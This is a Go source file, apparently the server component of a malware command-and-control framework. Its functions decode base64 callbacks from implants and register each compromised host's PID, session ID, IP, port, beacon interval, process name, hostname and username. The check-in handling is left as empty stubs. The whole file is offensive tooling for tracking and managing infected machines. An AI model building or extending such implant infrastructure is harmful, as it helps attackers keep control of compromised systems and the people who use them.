package implant

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
)

func ParseCallback(d io.ReadCloser, req *http.Request) int {
	r := base64.NewDecoder(base64.StdEncoding, d)
	var messageType uint16

	err := binary.Read(r, binary.BigEndian, &messageType)
	if err != nil {
		if err == io.EOF {
			return NIL
		}
	}


	if messageType == REG {
		ParseAndReg(r, req)
		return REG
	} else if messageType == CHK {
		
	}

	return NIL
}

func ParseAndReg(r io.Reader, req *http.Request) {
	println("registration request")

	i := new(ImplantMetadata)
	var arch byte
	var dataLen uint16
	binary.Read(r, binary.BigEndian, &i.PID)
	binary.Read(r, binary.BigEndian, &i.SessionID)
	binary.Read(r, binary.BigEndian, &i.IP)
	binary.Read(r, binary.BigEndian, &i.Port)
	binary.Read(r, binary.BigEndian, &i.Sleep)
	binary.Read(r, binary.BigEndian, &arch)
	binary.Read(r, binary.BigEndian, &dataLen)
	
	data := make([]byte, dataLen)
	binary.Read(r, binary.BigEndian, &data)


	dataS := bytes.Split(data, SEP)
	if len(dataS) != 3 {
		fmt.Println("data must have 3 entities and have ", i.PID, data)
		return
	}
	i.Proc = string(dataS[0])
	i.Hostname = string(dataS[1])
	i.User = string(dataS[2])
	

	imp := ImplantNew(fmt.Sprintf("%d", i.SessionID), "123")
	imp.ImplantSetMetadata(i)
	imp.ImplantSetRemoteIP(req.RemoteAddr)
	imp.ImplantAddImplant()
}


func ParseCheck(r io.Reader, req *http.Request) {

}